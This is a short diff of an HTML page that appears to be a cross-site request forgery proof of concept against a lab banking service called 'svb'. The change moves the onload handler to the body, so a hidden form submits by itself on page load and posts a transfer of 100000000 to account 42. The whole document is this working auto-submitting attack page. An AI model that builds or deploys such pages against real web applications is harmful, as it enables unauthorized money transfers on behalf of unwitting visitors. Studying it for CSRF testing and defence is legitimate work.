@@ -3,9 +3,9 @@
 <head>
 	<title>Send POST request on page load</title>
 </head>
-<body>
+<body onload="document.formTransfer.submit()">
 	<h1>Transfer Money</h1>
-	<form name = "formTransfer" method="post" action="http://svb:5003/transfer/1" onload="document.formTransfer.submit()">
+	<form name = "formTransfer" method="post" action="http://svb:5003/transfer/1">
 		<input type="text" name="account" value="42">
 		<input type="text" name="amount" value="100000000">
 		<input type="submit" value="Submit">
